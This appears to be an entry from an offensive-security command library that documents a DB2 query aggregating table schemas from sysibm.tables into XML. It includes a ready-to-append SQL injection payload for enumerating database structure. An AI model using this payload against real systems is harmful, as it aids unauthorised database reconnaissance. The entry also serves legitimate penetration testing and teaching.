---
id: e115f5ec-c7a7-42cc-a5c6-26cc1aebc795
name: DB2-Select-XMLAgg-XMLRow-Table-Schema-From-SysIBM-Tables
type: command
executor: sql
data: select xmlagg(xmlrow(table_schema)) from sysibm.tables
output: null
created_at: '2023-04-06T03:56:33.116094+00:00'
updated_at: '2023-04-10T20:22:05.851680+00:00'
platforms:
  - Linux
  - Windows
  - Cloud
tags:
  - db2
  - enumeration
  - xml
verified: true
validated: true
---

# DB2-Select-XMLAgg-XMLRow-Table-Schema-From-SysIBM-Tables

## Command

```sql
select xmlagg(xmlrow(table_schema)) from sysibm.tables
```

## Description

This SQL command aggregates all table schemas from the DB2 system catalog into a single XML-formatted string using XMLAGG and XMLROW functions. It is used in SQL injection contexts to enumerate database structure.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| xmlagg | Aggregates XML rows into a single document | Built-in |
| xmlrow(table_schema) | Converts each schema to an XML row | Built-in |
| sysibm.tables | System view containing table metadata | Built-in |

## Examples

### Basic Usage

```sql
select xmlagg(xmlrow(table_schema)) from sysibm.tables
```

### In Injection Payload

Append to a vulnerable query: `'; select xmlagg(xmlrow(table_schema)) from sysibm.tables --`

## Expected Output

A concatenated XML string like:

```xml
<row><table_schema>SCHEMA1</table_schema></row><row><table_schema>SCHEMA2</table_schema></row>...
```

## Related

- [[procedures/DB2-Schema-Enumeration-via-XML-Serialization]]
- [[commands/DB2-Select-XMLAgg-XMLRow-Distinct-Table-Schema-From-SysIBM-Tables]]
